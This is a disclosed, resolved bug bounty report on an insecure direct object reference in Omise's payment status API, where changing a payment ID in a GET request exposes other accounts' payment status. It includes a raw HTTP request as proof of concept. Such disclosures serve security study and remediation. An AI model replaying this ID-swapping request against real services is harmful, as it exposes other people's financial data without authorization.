---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1538669'
original_report_id: '1538669'
title: IDOR Payments Status
weakness: Business Logic Errors
team_handle: omise
created_at: '2022-04-12T10:58:59.607Z'
disclosed_at: '2022-09-06T08:58:27.726Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 27
asset_identifier: api.omise.co
asset_type: URL
max_severity: critical
tags:
- hackerone
- business-logic-errors
---

# IDOR Payments Status

## Metadata

- HackerOne Report ID: 1538669
- Weakness: Business Logic Errors
- Program: omise
- Disclosed At: 2022-09-06T08:58:27.726Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:

Found in the payment status function, IDOR's weakness.
Where when doing the experiment managed to see the payment status of another account
The following is the POC of the experiments carried out.
## Steps To Reproduce:
1.GET /payments/paym_test_xxxx/status HTTP/2
Host: api.omise.co
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://api.omise.co/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

2.changed the id of the payment on the part I replaced it with paym_test_xxxx

## Impact

The application does not validate the requested payment status value, whether it belongs to the account or not, so that attackers can see the payment status of other people's accounts,


Best regards,


Codeslayer137

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
